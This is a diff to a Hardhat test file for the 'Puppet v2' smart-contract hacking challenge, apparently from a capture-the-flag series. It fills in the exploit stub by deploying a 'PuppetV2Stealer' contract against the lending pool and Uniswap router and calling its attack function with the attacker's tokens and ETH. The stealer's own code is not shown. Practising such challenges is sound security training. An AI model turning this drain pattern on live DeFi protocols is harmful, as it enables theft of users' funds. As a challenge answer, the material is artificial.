@@ -4,6 +4,7 @@ const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json")
 
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { BigNumber } = require("ethers");
 
 describe('[Challenge] Puppet v2', function () {
     let deployer, attacker;
@@ -82,6 +83,16 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const stealer = await (await ethers.getContractFactory('PuppetV2Stealer', deployer)).deploy(
+            this.lendingPool.address,
+            this.token.address,
+            this.uniswapRouter.address,
+            this.weth.address,
+            attacker.address
+        );
+
+        await this.token.connect(attacker).approve(stealer.address, ethers.utils.parseEther('10000000000'));
+        await stealer.connect(attacker).attack(ATTACKER_INITIAL_TOKEN_BALANCE, {value: ethers.utils.parseEther('19.85')});
     });
 
     after(async function () {
